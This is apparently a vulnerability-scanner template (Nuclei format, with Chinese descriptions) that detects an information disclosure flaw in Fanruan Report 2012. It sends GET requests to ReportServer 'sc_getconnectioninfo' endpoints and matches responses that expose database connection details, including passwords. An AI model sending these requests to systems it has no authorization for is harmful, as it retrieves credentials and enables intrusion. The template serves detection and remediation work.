id: fanruanoa2012-disclosure

info:
  name: Fanruan Report 2012 - 信息泄露漏洞
  author: YanYun
  severity: high
  description: |
    该模板用于检测 Fanruan Report 2012 - 信息泄露漏洞。该类问题通常源于调试页面、配置文件、接口响应或目录资源被非预期暴露。模板会向 `/ReportServer?op=fr_server&cmd=sc_getconnectioninfo`、`/WebReport/ReportServer?op=fr_server&cmd=sc_getconnectioninfo` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可获取系统版本、路径、账号、密钥、配置或业务数据等敏感信息。
    - 泄露的信息可能被用于后续漏洞匹配、凭据攻击、权限提升或横向移动。
  remediation: |
    - 关闭不必要的调试、示例、备份和信息展示接口，避免向未授权用户返回敏感内容。
    - 对敏感文件和接口增加访问控制，并从 Web 根目录移除备份、日志和配置文件。
    - 排查已泄露的凭据、令牌和配置，必要时执行轮换并检查访问日志。
  reference:
    - http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%202012%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html
  metadata:
    max-request: 2
  tags: oa,java,fanruan,disclosure,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/ReportServer?op=fr_server&cmd=sc_getconnectioninfo"
      - "{{BaseURL}}/WebReport/ReportServer?op=fr_server&cmd=sc_getconnectioninfo"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '"connection"'
          - '"name"'
          - '"driver"'
          - '"password"'
          - '"url"'
          - '"user"'
        condition: and

      - type: word
        words:
          - "application/json"
        part: header
